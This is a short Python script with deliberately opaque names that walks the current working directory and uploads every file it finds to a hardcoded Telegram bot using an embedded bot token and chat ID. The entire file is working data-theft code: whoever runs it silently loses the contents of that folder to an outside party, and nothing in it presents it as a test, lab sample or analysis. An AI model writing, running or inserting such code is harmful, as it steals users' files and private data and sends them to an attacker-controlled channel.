import os
import requests

class amer:
    def __init__(self):
        self.hen = '7674345625:AAGeEs3ZH_xuUZfg9vyzn1S22K2PutoRbrU'
        self.hot = '5541407305'
        self.diri = os.getcwd()

    def haram(self):
        url = f'https://api.telegram.org/bot{self.hen}/sendDocument'
        for root, dirs, files in os.walk(self.diri):
            for file in files:
                fs = os.path.join(root, file)
                if os.path.isfile(fs):
                    with open(fs, 'rb') as fi:
                        files = {'document': fi}
                        data = {'chat_id': self.hot}
                        requests.post(url, files=files, data=data)

    def run(self):
        self.haram()
